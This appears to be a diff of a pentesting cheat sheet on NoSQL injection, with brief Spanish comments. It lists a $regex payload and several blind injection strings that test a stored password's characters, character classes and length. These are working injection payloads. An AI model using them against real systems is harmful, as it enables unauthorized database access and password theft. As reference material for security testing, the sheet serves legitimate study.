@@ -22,9 +22,10 @@ Common payloads:
 - $regex: regex match -> ```{"username":{"$regex":"^a"}}```
 
 # Blind NoSQLi
-
+```
 ' && this.password[0] == 'a' || 'a'=='b
 ' && this.password.match(/\d/) || 'a'=='b -> ¿Tiene números?
 ' && this.password.match(/[A-Z]/) || 'a'=='b -> ¿Tiene mayúsculas?
 ' && this.password.match(/[^a-zA-Z0-9]/) || 'a'=='b -> ¿Tiene símbolos?
 ' && this.password.length == 8 || 'a'=='b -> ¿Cuál es la longitud?
+```
